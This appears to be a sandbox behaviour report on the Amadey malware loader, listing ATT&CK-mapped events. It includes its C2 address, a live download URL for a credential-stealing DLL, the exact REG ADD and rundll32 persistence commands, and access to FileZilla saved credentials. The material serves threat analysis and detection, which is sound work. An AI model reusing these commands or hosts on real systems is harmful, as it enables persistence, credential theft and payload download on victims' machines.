# Amadey Loader

Version 1.76

password : infected

c2 : http[:]//170.130.55[.]77/s1Qa9vCs/index.php


T1106 -  Starts itself from another location

cmdChild: c:\programdata\5a997433d2\gbnn.exe

cmdParent: "C:\Users\admin\AppData\Local\Temp\load.exe"

image: c:\programdata\5a997433d2\gbnn.exe

time: 688 ms


T1129 -  rundll32.exe - Loads dropped or rewritten executable


T0185 - Uses RUNDLL32.EXE to load library

cmdline: rundll32.exe C:\Users\admin\AppData\Local\Temp\cred.dll, Main

image: C:\Windows\system32\rundll32.exe

time: 23422 ms


T1060 -  REG.exe - Changes the autorun value in the registry

key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

name: scr

operation: write

typeValue: REG_SZ

value: rundll32 C:\Users\admin\AppData\Local\Temp\scr.dll, Main

time: 23829 ms


T1060 -  REG.exe - Changes the autorun value in the registry

key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

name: cred

operation: write

typeValue: REG_SZ

value: rundll32 C:\Users\admin\AppData\Local\Temp\cred.dll, Main

time: 23500 ms


T1060 -  REG.exe - Changes the Startup folder

key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

name: Startup

operation: write

typeValue: REG_SZ

value: C:\ProgramData\5a997433d2

time: 1282 ms


T1088 - DllHost.exe - Known privilege escalation attack

cmdline: "C:\Users\admin\AppData\Local\Temp\chil16d.exe"

image: C:\Users\admin\AppData\Local\Temp\chil16d.exe


T1112 - gbnn.exe - Uses REG.EXE to modify Windows registry

cmdline: REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /f /v Startup /t REG_SZ /d C:\ProgramData\5a997433d2

image: C:\Windows\system32\REG.exe

time: 1204 ms


T1085 - gbnn.exe -  Uses RUNDLL32.EXE to load library

cmdline: rundll32.exe C:\Users\admin\AppData\Local\Temp\cred.dll, Main

image: C:\Windows\system32\rundll32.exe

time: 23422 ms


T1081 - Rundll32.exe - Actions looks like stealing of personal data

access: READ_CONTROL, SYNCHRONIZE, FILE_READ_DATA, FILE_READ_EA, FILE_READ_ATTRIBUTES

created: SUPERSEDED

device: DISK_FILE_SYSTEM

name: C:\Users\admin\AppData\Roaming\FileZilla\sitemanager.xml

object: FILE

operation: CREATE

status: 0xC0000034

time: 23532 ms


T1012 - Query Registry

Uses REG.EXE to modify Windows registry

cmdline: REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /f /v Startup /t REG_SZ /d C:\ProgramData\5a997433d2

image: C:\Windows\system32\REG.exe

time: 1204 ms


T1105 - gbnn.exe - Downloads executable files from the Internet

host: 170.130.55.77

method: GET

process: c:\programdata\5a997433d2\gbnn.exe

request: http://170.130.55.77/s1Qa9vCs/cred.dll

time: 25160 ms



